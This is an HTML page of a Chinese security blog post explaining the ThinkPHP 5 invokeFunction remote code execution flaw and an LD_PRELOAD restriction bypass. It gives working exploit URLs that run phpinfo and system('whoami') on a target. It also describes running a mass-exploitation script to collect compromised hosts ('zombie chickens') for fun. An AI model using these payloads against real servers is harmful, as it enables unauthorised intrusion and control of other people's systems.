@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    
+    <title>一次养肉鸡的奇妙经历 | HG0434</title>
+    
+    
+        <meta property="og:site_name" content="HG0434">
+    
+    
+        <meta property="article:author" content="hongzh0">
+    
+    
+        <link rel="icon" href="/img/favicon.ico">
+    
+    
+<link rel="stylesheet" href="/css/minireset.min.css">
+
+    
+<link rel="stylesheet" href="/css/all.min.css">
+
+    
+<link rel="stylesheet" href="/css/csshake.min.css">
+
+    
+<link rel="stylesheet" href="/css/hljs/lioshi.css">
+
+    
+<link rel="stylesheet" href="/css/jquery.fancybox.min.css">
+
+    
+<link rel="stylesheet" href="/styl/main.css">
+
+    
+<script src="/js/jquery.min.js"></script>
+
+    
+<script src="/js/highlight.min.js"></script>
+
+    
+<script src="/js/jquery.fancybox.min.js"></script>
+
+    
+<script src="/js/clipboard.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <header>
+  <div class="outer">
+    <div class="inner">
+      <h1 class="logo-wrap">
+        <a>HG0434<b><sup></sup></b></a>
+      </h1>
+    </div>
+    <div class="inner">
+      <nav class="main-nav">
+        
+          <a href="/">首页</a>
+        
+          <a href="/archives">归档</a>
+        
+          <a href="/xiaohua">网安圈</a>
+        
+          <a href="/about">关于</a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+    <div class="content">
+        <section class="outer">
+    <article>
+        <div class="article-title">
+    <h2><a href="/2025/02/02/rouji1/" class="shake shake-little" title="一次养肉鸡的奇妙经历">一次养肉鸡的奇妙经历</a></h2>
+    <div class="meta_box">
+    
+        
+        
+            
+        
+            
+        
+        
+        <div class="meta meta_auth">
+            <img src="/img/hongzh0.png" alt="head" />
+            <p>hongzh0</p>
+        </div>
+    
+        
+        
+        <div class="meta meta_date">
+            <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+            <p>发布于：2025年02月02日</p>
+        </div>
+    
+        <div class="meta meta_update">
+            <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+            <p>更新于：2025年02月02日</p>
+        </div>
+    </div>
+    
+  <div class="post_tags">
+    <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/rouji/" rel="tag"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>rouji</a></li></ul>
+  </div>
+
+
+</div>
+
+        <hr>
+        <div class="article-entry">
+            
+            
+            
+            <h3 id="tp5-invoke-func-code-exec-1原理"><a href="#tp5-invoke-func-code-exec-1原理" class="headerlink" title="tp5 invoke func code exec 1原理"></a>tp5 invoke func code exec 1原理</h3><p>这两天跟九做项目，他给我一个全版本tp利用脚本，每天挂着脚本坐等shell</p>
+<p>tp5 invoke func code exec 1出了一堆，养几只鸡玩</p>
+<p>invokeFunction 是 ThinkPHP 5 框架中的一个方法，位于 think\App 类中，通常用于动态调用函数。其定义如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function invokeFunction($function, array $vars = [])</span><br><span class="line">&#123;</span><br><span class="line">    return call_user_func_array($function, $vars);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得先看看这个：call_user_func_array</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//直接传递参数</span><br><span class="line">function funcC($a, $b) &#123;</span><br><span class="line">    echo $a .&#x27; - &#x27;. $b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//用 func_get_args() 函数获取传递的参数</span><br><span class="line">function funcD($a, $b) &#123;</span><br><span class="line">    $args = func_get_args();</span><br><span class="line">    print_r($args);</span><br><span class="line">&#125;//后面传递的是array参数</span><br><span class="line">call_user_func_array(&#x27;funcC&#x27;, array(&#x27;1&#x27;, &#x27;2&#x27;));</span><br><span class="line">call_user_func_array(&#x27;funcD&#x27;, array(&#x27;d1&#x27;, &#x27;d2&#x27;));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/679f3ec3d0e0a243d4f98f2d.png"></p>
+<p>可以看到这个函数可以调用其他函数并且进行传参</p>
+<p>在某些版本的 ThinkPHP 5，invokeFunction 可能被暴露在 URL 解析逻辑中。例如：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://target.com/index.php?s=invokeFunction&function=phpinfo">http://target.com/index.php?s=invokeFunction&amp;function=phpinfo</a></p>
+</blockquote>
+<p>执行流程：</p>
+<ul>
+<li>ThinkPHP 解析 URL<br>  通过 s 参数解析出 invokeFunction 方法。</li>
+<li>function 变量可控<br>  攻击者传入 function&#x3D;phpinfo，则 invokeFunction(‘phpinfo’) 被执行。</li>
+<li>最终执行 call_user_func_array(‘phpinfo’, [])<br>  结果：服务器返回 phpinfo() 信息。</li>
+</ul>
+<p>如果要进行命令执行的话可以执行</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://target.com/index.php?s=invokeFunction&function=system&vars%5B%5D=whoami">http://target.com/index.php?s=invokeFunction&amp;function=system&amp;vars[]=whoami</a></p>
+</blockquote>
+<h3 id="LD-PRELOAD利用原理"><a href="#LD-PRELOAD利用原理" class="headerlink" title="LD_PRELOAD利用原理"></a>LD_PRELOAD利用原理</h3><p>拿到shell之后没法执行部分命令，尝试绕过一下</p>
+<blockquote>
+<p>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p>
+</blockquote>
+<p>举个例子，这个是个验证密码的思路<br><img src="https://pic1.imgdb.cn/item/679f414ed0e0a243d4f98f45.png"></p>
+<p>肯定会调用mystrcmp()函数来对比字符串，而在被替换后，可以在执行验证密码调用mystrcmp()函数再调用危险函数</p>
+
+        </div>
+        <div class="article-copyright">
+            
+    <blockquote>
+        <p>
+            版权声明：本文为「hongzh0」的原创文章，博客内容遵循 署名-非商业性使用-相同方式共享 协议。
+        </p>
+    </blockquote>
+
+
+        </div>
+    </article>
+    
+
+    <section id="toc-div" >
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#tp5-invoke-func-code-exec-1%E5%8E%9F%E7%90%86"><span class="toc-text">tp5 invoke func code exec 1原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LD-PRELOAD%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-text">LD_PRELOAD利用原理</span></a></li></ol>
+    </section>
+    <section id="gohome" style="display: none;"><a>顶</a></section>
+
+    <script>
+        function get_top_by_link(link){
+            var hnid = "#" + $(link).attr("data");
+            if ($(hnid).length > 0){
+                return $(hnid).offset().top;
+            }else{
+                return 0;
+            }
+        }
+        //go to hn
+        function gotohn(link){
+            $("html,body").animate({scrollTop: get_top_by_link(link) }, 300);
+        }
+        //页面滚动
+        function update(){
+            var scrollH = $(window).scrollTop();
+            if($(".toc-link")){
+                $(".toc-link").each(function(i,link){
+                    var mdHeight = get_top_by_link(link);
+                    if(mdHeight < scrollH + 50){
+                        //高亮导航菜单
+                        $('.toc-link').removeClass('on');
+                        $(link).addClass('on');
+                    }
+                });
+            }
+            if(scrollH < 200){
+                $("#gohome").css("display","none");
+            }else{
+                $("#gohome").css("display","block");
+            }
+        }
+        $(function(){
+            //修复部分锚点从属关系
+            if($("#toc-div >li").length > 0){
+                $("#toc-div >li").appendTo($("#toc-div >ol:first"));
+            }
+            //返回顶部
+            $('#gohome').click(function(){
+                $("html,body").animate({scrollTop: 0}, 300);
+                return false;
+            })
+            //遍历锚点
+            $(".toc-link").each(function(i,link){
+                $(link).attr("data",$(link).attr('href').substring(1));
+                $(link).attr("href","javascript:void(0);");
+                $(link).attr("onclick","gotohn(this);");
+            })
+            //绑定滚动事件
+            $(window).bind('scroll', update);
+            //初始化toc
+            var first_toc = $(".toc-link")[0];
+            var first_scroll = get_top_by_link(first_toc);
+            var window_scroll = $(window).scrollTop();
+            if(window_scroll <= first_scroll){
+                $(first_toc).addClass('on');
+            }
+        })
+    </script>
+
+</section>
+    </div>
+    <footer>
+    <div class="outer">
+        <div class="inner">
+            Powered by <a href="http://prowiki.demopage.icu/" target="_blank">ProWiki</a>
+            &copy;2025 hongzh0<br>
+            <a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/"></a>
+        </div>
+    </div>
+</footer>
+
+<script src="/js/custom.js"></script>
+
+
+    <script>onload_content();</script>
+
+</body>
+</html>
